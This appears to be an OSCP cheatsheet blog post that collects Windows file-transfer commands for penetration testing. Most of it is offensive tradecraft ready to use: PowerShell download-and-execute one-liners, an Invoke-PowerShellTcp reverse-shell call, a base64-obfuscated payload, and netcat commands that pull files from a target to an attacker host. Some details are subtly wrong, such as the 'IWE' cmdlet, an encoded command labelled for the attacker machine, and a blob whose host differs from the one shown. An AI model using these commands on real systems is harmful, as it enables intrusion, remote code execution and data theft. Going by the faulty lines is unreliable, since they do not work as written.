---
title: Windows File Transfers
author: sKyW1per
category: "OSCP"
date: "2021-03-10 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---

###### Start a webserver
```
Python3
$ sudo python3 -m http.server 80
Python2
$ sudo python -m SimpleHTTPServer 80
```

###### wget
```
$ wget.exe http://192.168.119.1:80/file.txt
$ powershell.exe -exec bypass -Command "wget http://192.168.119.1:80/file.txt"
```

###### certutil
```
$ certutil.exe -urlcache -f http://192.168.119.1:80/file.txt file.txt
$ powershell.exe -exec bypass -Command "& {certutil.exe -urlcache -f http://192.168.119.1:80/file.txt}"
```

###### Powershell
```
Download
$ powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.1/Invoke-PowerShellTcp.ps1', 'C:\Invoke-PowerShellTcp.ps1')

Download - newer variant:
$ IWE -uri http://192.168.119.1:80/file.exe -outfile file.exe

Run
$ Invoke-PowerShellTcp.ps1 -Reverse -IPAddress 192.168.119.1 -Port 443

Execute exe
$ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoPro
file -File Invoke-PowerShellTcp.ps1

Download and execute immediately
$ powershell.exe -c IEX (New-Object System.Net.WebClient).DownloadString('
http://192.168.119.1/Invoke-PowerShellTcp.ps1')
$ powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('
http://192.168.119.1/Invoke-PowerShellTcp.ps1')

or newer variant:
$ powershell.exe -c 'IEX(IWR http://192.168.1.1/Invoke-PowerShellTcp.ps1 -UseBasicParsing)'


base64 encoding to avoid badchars or to obfuscate:
in linux:
$ echo "powershell.exe -c 'IEX(IWR http://192.168.1.1/file.ps1 -UseBasicParsing)'" | iconv -f ASCII -t UTF-16LE | base64 | tr -d "\n"
result = a base64 blob.
Then run on attacker machine:
$ powershell.exe -nop -exec bypass -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjACAAJwBJAEUAWAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBmAGkAbABlAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkAJwAKAA==
```


###### impacket-smbserver
```
On attacker machine:
$ impacket-smbserver transfer ./

On victim machine:
$ dir \\192.168.119.1\transfer
$ copy \\192.168.119.1\transfer\file.exe ./

Specify SMB2 support
$ impacket-smbserver -smb2support transfer ./
```

###### netcat
```
On the target system:
$ nc -lvp 80 > file.txt
On the attacker system:
$ nc 192.168.119.1 80 < file.txt

Also works the other way, to get files back to the attacker system:
On the attacker system:
$ nc -lvp 80 > file.txt
On the target system:
$ cmd.exe /c ".\nc.exe -w 3 192.168.119.1 80 < file.txt"
```
